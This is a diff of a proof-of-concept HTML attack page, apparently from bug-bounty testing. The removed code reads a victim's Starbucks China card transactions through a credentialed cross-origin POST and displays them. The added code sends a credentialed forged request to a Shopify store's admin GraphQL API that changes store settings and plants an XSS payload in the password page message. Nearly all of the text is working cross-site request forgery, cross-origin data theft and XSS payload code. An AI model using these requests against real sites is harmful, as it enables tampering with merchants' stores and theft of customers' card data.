@@ -10,7 +10,7 @@
 </br>
 <div>
 click the button to Steal the customer's cards informations!
-<button id="stealCards" onclick="submitRequest()">Steal the customer's cards informations</button>
+<button id="stealCards" onclick="stealCardsTransactions()">Steal the customer's cards informations</button>
 </div>
 <div text="steal customer's cards informaiton">
 steal customer's cards informaiton
@@ -32,45 +32,20 @@ steal customer's cards Transactions
 <script>
 	var cardsID;
 	
-      function submitRequest()
-      {
-        var xhr = new XMLHttpRequest();
+      function submitRequest(){
+          }
+
+	
+		
+	function stealCardsTransactions(){
+		 var xhr = new XMLHttpRequest();
         xhr.open("POST", "https://johnstone-attacker.myshopify.com/admin/online-store/admin/api/unversioned/graphql", true);
         xhr.setRequestHeader("Accept", "*/*");
         xhr.setRequestHeader("Accept-Language", "zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3");
         xhr.setRequestHeader("Content-Type", "application/json; charset=utf-8");
         xhr.withCredentials = true;
         xhr.send(JSON.stringify({"operationName":"PreferencesSave","variables":{"preferences":{"seo":{"title":"","description":""},"googleAnalytics":{"snippet":"","additionalJavascript":"","enhancedEcommerceEnabled":false,"dynamicRemarketingEnabled":false,"universalEnabled":true},"facebookPixel":{"pixelId":""},"cookieConsent":{"level":"IMPLICIT"},"privacyCompliancePolicies":{"ccpaBlockAllEnforced":false,"gdprEnforced":false},"socialSharingImage":{"src":null},"passwordProtection":{"enabled":true,"password":"owlyot","message":"'\"<img src=\"x\" id=\"test\" onerror=\"alert(1)\">// "},"captchaProtection":{"enabledOnCheckout":null,"enabledOnStorefront":false,"externalDomains":null}}},"query":"mutation PreferencesSave($preferences: OnlineStorePreferencesInput!) {\n  onlineStorePreferencesUpdate(preferences: $preferences) {\n    userErrors {\n      field\n      message\n      __typename\n    }\n    onlineStore {\n      ...PreferencesOnlineStoreFragment\n      __typename\n    }\n    __typename\n  }\n}\n\nfragment PreferencesOnlineStoreFragment on OnlineStore {\n  seo {\n    title\n    description\n    __typename\n  }\n  facebookPixel {\n    pixelId\n    __typename\n  }\n  cookieConsent {\n    level\n    __typename\n  }\n  visitorTrackingConsent {\n    preference\n    __typename\n  }\n  privacyCompliancePolicies {\n    gdprEnforced\n    ccpaBlockAllEnforced\n    __typename\n  }\n  googleAnalytics {\n    additionalJavascript\n    trackingId\n    dynamicRemarketingEnabled\n    enhancedEcommerceEnabled\n    universalAnalyticsEnabled\n    __typename\n  }\n  passwordProtection {\n    enabled\n    password\n    message\n    canDisablePassword\n    permanentStorefrontPasswordPage\n    __typename\n  }\n  captchaProtection {\n    enabledOnCheckout\n    enabledOnStorefront\n    externalDomains\n    __typename\n  }\n  socialSharingImage {\n    src: originalSrc\n    __typename\n  }\n  socialSharingImageFallback {\n    src: originalSrc\n    __typename\n  }\n  shouldShowShopifyPaymentsSetupBanner\n  __typename\n}\n"});
-    }
-
-	
-		
-	function stealCardsTransactions(){
-		var data ={};
-                var cards = {};
-		cards["id"] = cardsID;
-		data["data"] = cards;
-		$.ajax({
-			    url : 'https://cards.starbucks.com.cn/cards/transactions',
-			    type : 'POST',
-			    dataType:'json',
-			    contentType:'application/vnd.api+json',
-			    data:JSON.stringify(data),
-			    xhrFields: {
-			     withCredentials: true
-			 },
-			    success : function(response, textStatus, jqXhr) {
-				document.getElementById("transactions").innerHTML = JSON.stringify(response.data);
-                                console.log(response);
-			    },
-			    error : function(jqXHR, textStatus, errorThrown) {
-				// log the error to the console
-				console.log("The following error occured: " + textStatus, errorThrown);
-			    },
-			    complete : function() {
-				console.log("complete");
-			    }
-        });
+ 
 	}
 	
 	
